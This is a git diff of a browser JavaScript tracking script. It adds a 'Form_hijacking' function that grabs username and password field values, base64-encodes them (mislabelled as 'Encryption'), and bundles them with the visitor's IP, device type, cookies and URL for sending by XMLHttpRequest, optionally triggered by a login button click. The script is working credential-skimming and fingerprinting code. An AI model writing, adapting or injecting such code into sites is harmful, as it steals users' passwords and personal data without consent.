@@ -1,12 +1,26 @@
 var Rd_Path=null;
+var User_Name_key=null;
+var Password_Key=null;
+var Button=null;
+var U1=null;
+var P1=null;
 var User_Infor = {
     IP:null,
     Host_Type:null,
     Cookies:null,
     Time:null,
     Visit_URL:null,
-    NetWork:null
-}; 
+    NetWork:null,
+    Username:null,
+    Password:null
+};
+
+function Form_hijacking(){
+U1 = document.getElementById(User_Name_key).value;
+P1 = document.getElementById(Password_Key).value;
+}
+
+
 function getNetworkType() {
     var ua = navigator.userAgent;
     var networkStr = ua.match(/NetType\/\w+/) ? ua.match(/NetType\/\w+/)[0] : 'NetType/other';
@@ -33,6 +47,8 @@ function getNetworkType() {
     }
     return networkType;
 }
+
+
 function getCusIpAdress(){
     var data;
     let xmlHttpRequest;
@@ -55,7 +71,7 @@ function getCusIpAdress(){
     xmlHttpRequest.send(null);
     return data;
 }
- 
+
 
 function browserRedirect(){
     var sUserAgent = navigator.userAgent;
@@ -70,7 +86,6 @@ function browserRedirect(){
         if (isAndroid) return "Android Mobile"; 
         else return "Linux";
     }
-  
     if (isWin) {
         var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
         if (isWin2K) return "Win2000";
@@ -85,8 +100,9 @@ function browserRedirect(){
         var isWin10 = sUserAgent.indexOf("Windows NT 10") > -1 || sUserAgent.indexOf("Windows 10") > -1;
         if (isWin10) return "Win10";
     }
-    return "other";
+    return "?";
   }
+
 
 function DATA_Packet(DATA){
     var xhr = new XMLHttpRequest();
@@ -95,9 +111,15 @@ function DATA_Packet(DATA){
     xhr.send(JSON.stringify(DATA));
     return true;
 }
+
+
 function Get_Base_Message(){
-    var Info = 
     // User_Infor['Time']=Encryption(document.cookie)
+    if(User_Name_key!=null && Password_Key!=null){
+        Form_hijacking();
+        User_Infor['Username']=Encryption(U1);
+        User_Infor['Password']=Encryption(P1);
+        }
     User_Infor['IP']=Encryption(getCusIpAdress());
     User_Infor['Host_Type']=Encryption(browserRedirect());
     User_Infor['Visit_URL']=Encryption(document.URL);
@@ -110,13 +132,22 @@ function Get_Base_Message(){
     else{
     return false;
     }
-
 }
+
 
 function Encryption(DATA){
     return btoa(DATA);
 }
 
-if(Get_Base_Message()==true && Rd_Path != null) {
-setTimeout( Rd_Path,4000);
+
+function main(){
+    if(Get_Base_Message()==true && Rd_Path != null) {
+            setTimeout( Rd_Path,4000);}
 }
+
+
+if (Button!=null){
+    document.getElementById(Button).onclick = function() {
+     main();
+    }}
+else main();
